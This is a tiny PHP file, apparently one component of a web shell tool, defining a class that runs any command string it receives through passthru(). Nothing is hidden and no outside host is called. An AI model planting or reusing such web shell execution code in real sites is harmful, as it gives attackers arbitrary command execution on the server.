<?php
namespace WebShell;

final class PassthruExecutionMethod extends BlindExecutionMethod
{
    protected function run_command(string $cmd): void
    {
        passthru($cmd);
    }
}
?>
